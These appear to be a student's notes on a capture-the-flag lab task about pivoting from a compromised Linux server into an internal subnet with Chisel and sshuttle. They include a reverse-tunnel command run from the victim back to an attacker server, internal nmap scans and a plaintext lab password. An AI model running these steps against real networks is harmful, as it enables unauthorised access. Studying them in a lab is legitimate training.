Now that you have gained root access to L-SRV01, you need to identify where to go next. You know there are no other external machines in scope, so you decide to move into the internal network. To gain access to the internal subnet, you need to perform what is known as pivoting.

In a well-maintained network, often referred to as a "Segmented Network," there are specific rules in place preventing users from accessing certain parts of the Internal LAN (ex. The Workstation Subnet should not be able to access the Server Subnet). We will need to "pivot" from an already compromised server using a SOCKs server or other means like port forwarding to access different network resources.  

There are several tools outlined below that can help us in pivoting.  

- sshuttle
- Chisel
- Ligolo
- Metasploit autoroute

In this task, we will be focusing on both Chisel and sshuttle, each offering unique ways to approach pivoting.  

## Chisel

The first tool that we will be looking at is Chisel. From the Chisel GitHub, *"Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable, including both client and server. Written in Go (Golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network."*  

From the Chisel GitHub, below is an overview of chisel architecture.

![[Task 23 - Digging a tunnel to nowhere-20240926150119258.webp]]

To begin using Chisel, we must first download the tool. If you utilize the stable release or docker, you will not need to download any dependencies. If you compile from source, you will need to install a few dependencies outlined on their GitHub. There are three common ways of obtaining the tool, outlined below.  

- Stable release: [](https://github.com/jpillora/chisel/releases)[https://github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases)
- Docker: `docker run --rm -it jpillora/chisel --help`
- Source: `go get -v [github.com/jpillora/chisel](<http://github.com/jpillora/chisel>)`

To set up the Chisel server on a Windows machine, you will need to get the Windows binary and vice versa.  

To create a SOCKs server with Chisel, you will only need two commands ran on the target and the attacking machine, outlined below.  

On the attacking machine: `./chisel server -p 8000 --reverse`

On the target machine: `./chisel client <SERVER IP>:8000 R:socks`

Now that we have a SOCKs server set up, we need to interpret and manage these connections. This is where proxychains come in. Proxychains allows us to connect to the SOCKs server and route traffic through the proxy in the command line. To add the SOCKs server to proxychains, you will need to edit `/etc/proxychains.conf`. You can see an example configuration below.

![[Task 23 - Digging a tunnel to nowhere-20240926150205470.webp]]

You will need to add the following line to the configuration file: `socks5 127.0.0.1 1080`

To use the proxy, you will need to prepend any commands you want to route through the proxy with proxychains. An example usage can be found below.  

Example usage: `proxychains curl http://<IP>`



## sshuttle
The second tool we will be looking at is sshuttle. Sshuttle is unique in its approaches to pivoting because all of its techniques are done remotely from the attacking machine and do not require the configuration of proxychains. However, a few of the disadvantages of sshuttle are that <u>it will only work if there is an ssh server running on the machine</u>, and it <u>will not work on Windows hosts</u>. You can download sshuttle from GitHub, [https://github.com/sshuttle/sshuttle](https://github.com/sshuttle/sshuttle)  

Using sshuttle is relatively easy and only requires one command. For sshuttle to work, you only need to specify one parameter, -r . With this parameter, you will specify the user and target like you would for a standard ssh connection. You will also need to specify the CIDR range of the network; this does not require a parameter. Find an example of syntax below.  

Syntax: `sshuttle -r USER@MACHINE_IP 0.0.0.0/0`

For more information about sshuttle and how to use it, check out the documentation, [https://sshuttle.readthedocs.io/en/stable/overview.html](https://sshuttle.readthedocs.io/en/stable/overview.html).


---

# Your job

Before you can pivot, you do need to know where you are in the network and where you are trying to get to.
Creating a Network Diagram is the best way to do it.

![[Diagram.svg]]

The above diagram shows the route: 
- You went via a docker container and back to the host that had the 4 websites right back at the start. 
- Then you got root on that via docker.
- You added a SSH key so you now have direct access to that box via SSH as either the **root** user or the **linux-admin** user with the cracked password.
- Looking at y your THM dashboard, two new IP have appeared, which are 10.200.X.30 and 10.200.X.31. 
- You cannot ping this from your host, so instead you will have to pivot through the webserver (L-SRV01) host to gain access to it.

## Pivoting with chisel

- SSH to L-SRV01 with the following credentials:
	User: `linux_admin`
	Password: `linuxrulez`
	`ssh linux_admin@10.200.X.33`
or
- [[SSH to the victim machine with a key.]]

- On the attacking machine: `./chisel server -p 8000 --reverse`

- On the target machine: `./chisel client <SERVER IP>:8000 R:socks`

## Pivoting with sshuttle


> [!Note]
The command requires a few bits of information, these include: 
The username and address of your pivot target.
A keyfile if you are using a key pair (which you are).
The subnet you want to gain access too and you need to remove the IP you are connecting too, otherwise everything gets very confused. This translates to:
`sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET -x <IP>`


- Run on the attacking machine the following command:
	`sshuttle -r root@admin.holo.live --ssh-cmd "ssh -i /home/kali/.ssh/id_rsa" 10.200.X.0/24 -x 10.200.X.33`
	![[Task 23 - Digging a tunnel to nowhere-20241008134113133.webp]]

- On another terminal connect via SSH.
	`ssh root@admin.holo.live -i /home/kali/.ssh/id_rsa` 

- Run nmap against the target 10.200.X.31.
	root@ip-10-200-95-33:~# `nmap 10.200.95.31 -Pn`
	
	![[Task 23 - Digging a tunnel to nowhere-20241008140800233.webp]]

- Look at the internal network.
	root@ip-10-200-95-33:~# `nmap 10.200.95.0/24 -Pn`
	
	![[Task 23 - Digging a tunnel to nowhere-20241008141821503.webp]]
	
You've found the following 5 hosts available:

	- 10.200.95.30
    - 10.200.95.31
    - 10.200.95.32
    - 10.200.95.33
    - 10.200.95.35


**Next step:** [[Task 24 - Command your Foes and Control your Friends]]